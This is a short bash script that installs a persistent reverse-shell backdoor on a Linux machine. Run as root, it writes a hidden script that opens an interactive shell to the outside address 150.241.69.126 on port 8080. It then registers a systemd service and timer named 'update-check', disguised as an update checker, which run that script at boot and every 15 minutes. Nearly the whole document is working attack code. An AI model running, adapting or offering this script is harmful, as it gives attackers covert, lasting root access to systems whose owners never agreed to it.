#!/bin/bash

# Exit if not root
if [[ $EUID -ne 0 ]]; then
    echo "❌ This script must be run as root."
    exit 1
fi

# Create reverse shell script
cat << 'EOF' > /usr/local/bin/update-check.sh
#!/bin/bash
exec 0</dev/null
exec 1>/dev/null
exec 2>/dev/null
bash -i >& /dev/tcp/150.241.69.126/8080 0>&1
EOF

chmod +x /usr/local/bin/update-check.sh

# Create systemd service
cat << 'EOF' > /etc/systemd/system/update-check.service
[Unit]
Description=Check for system updates

[Service]
Type=oneshot
ExecStart=/usr/local/bin/update-check.sh
EOF

# Create systemd timer
cat << 'EOF' > /etc/systemd/system/update-check.timer
[Unit]
Description=Run update checker every 15 minutes

[Timer]
OnBootSec=1min
OnUnitActiveSec=15min
Persistent=true

[Install]
WantedBy=timers.target
EOF

# Enable and start timer
systemctl daemon-reload
systemctl enable update-check.timer
systemctl start update-check.timer

echo "✅ Persistence setup complete."
